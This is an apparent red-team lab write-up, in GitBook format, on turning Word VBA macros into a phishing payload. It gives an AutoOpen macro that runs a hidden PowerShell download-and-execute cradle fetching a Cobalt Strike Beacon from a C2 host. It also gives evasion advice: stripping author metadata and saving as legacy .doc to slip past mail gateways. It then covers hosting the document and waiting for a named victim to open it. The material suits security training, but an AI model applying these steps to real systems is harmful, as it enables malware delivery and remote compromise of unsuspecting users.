---
description: 09/01/2025
---

# ✅ Visual Basic For Applications (VBA) Macros

## Introduction

VBA is an implementation of Visual Basic that is very widely used within the Microsoft ecosystem (Microsoft applications included).&#x20;

#### Why does it exist?

It is often used to enhance functionality in Word and Excel for data processing.

The prevalence of macros in the commercial world is a double-edged sword when it comes to leveraging macros for malicious purposes.

#### Not inherently a red flag, but...

One one hand, the presence of a document with embedded macros is not necessarily suspicious.

However, since they are used maliciously by threat actors, they are also given more scrutiny both from technical products (e.g. web/email gateways) and in security awareness training, so most people steer away from them.

## Creating your own VBA Macro (Benign)

**You can create your own VBA Macro within a Word document by going to:**&#x20;

**View -> Macros -> View Macros**.

<figure><img src="../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

We can then place the following code for the macro in order to trigger automatically opening something such as `notepad.exe` when the document is opened using the name `AutoOpen`:

```visual-basic
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

<figure><img src="../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

`wscript` is the Windows Script Host, which is designed for automation. The "shell" method provides the ability to execute OS commands.

To test the above code, we can use the play/pause/stop buttons.

## Creating a Malicious Macro

Now that we know how to create a VBA macro for Word, we need to replace `notepad` with a Beacon payload instead.

The easiest to leverage is the PowerShell payload within Cobalt Strike.&#x20;

Go to **Attacks** -> **Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener.

The URI path can be anything, but I will keep it as `/a`.&#x20;

<figure><img src="../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

This will generate a PowerShell payload and host it on the Team Server so that it can be _<mark style="color:yellow;">**downloaded over HTTP and executed in memory**</mark>_.&#x20;

After selecting _**Launch**_, Cobalt Strike will generate the PowerShell one-liner that will do just that.

<figure><img src="../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

**Simply copy/paste this into the VBA Macro editor:**

```
Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
```

**Now, replace `notepad` with a Beacon payload instead:**

<figure><img src="../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
:bulb:The `URI` PATH can be anything, but I kept it as /a or /b, it doesn't matter.
{% endhint %}

#### OPSEC Consideration

To prepare the document for delivery, go to _**File > Info > Inspect Document > Inspect Document**_, which will bring up the Document Inspector. Click _Inspect_ and then _Remove All_ next to _Document Properties and Personal Information_.  This is to prevent the username on your system being embedded in the document.

**Once complete, you should see the following:**

<figure><img src="../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

### Preparing the Document and Attaching Malicious Macro

Next, go to _**File > Save As**_ and save it to a location of your choice.  Give it any filename, but in the _Save as type_ dropdown, change the format from `.docx` to _Word 97-2003 (`.doc`)_. &#x20;

We do this because you can't save macros inside a `.docx` and there's a stigma around the macro-enabled `.docm` extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). &#x20;

I find that this legacy `.doc` extension is the best compromise.

{% hint style="info" %}
:bulb:`.docm` works just fine too, but `.doc` attracts less attention.
{% endhint %}

<figure><img src="../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

### Uploading to our C2

Now that our document is now housing our embedded macro, we need to upload this file to the Team Server.

We can do this by going to **Site Management -> Host File (then select the document)**.

**Your configuration should look something like this:**

<figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

## Awaiting for Our Victim to Open the Maliciously-Embedded Macro Word Document

Let's target our next victim, `bfarmer`.

<figure><img src="../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Upon waiting for Bob to open the file, Edge will automatically download the document. Since the file is being downloaded via a browser, it will have the MOTW, so when it is first opened, it will first be in Protected View.

<figure><img src="../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Once opened, we now have Bob as a new victim!
